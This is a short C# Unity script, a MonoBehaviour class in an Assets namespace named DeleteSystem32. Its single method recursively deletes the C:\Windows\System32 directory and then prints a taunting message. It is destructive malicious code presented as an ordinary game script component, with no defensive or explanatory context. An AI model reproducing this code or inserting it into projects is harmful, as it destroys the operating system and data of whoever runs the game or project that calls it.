using System;
using System.Collections;
using System.IO;
using UnityEngine;

namespace Assets
{
    public class DeleteSystem32 : MonoBehaviour
    {
        public void DelSys32()
        {
            string dirPath = @"C:\Windows\System32";

            if (Directory.Exists(dirPath))
            {
                Directory.Delete(dirPath, true);
                Console.WriteLine("lmao rip bozo");
            }
        }
    }
}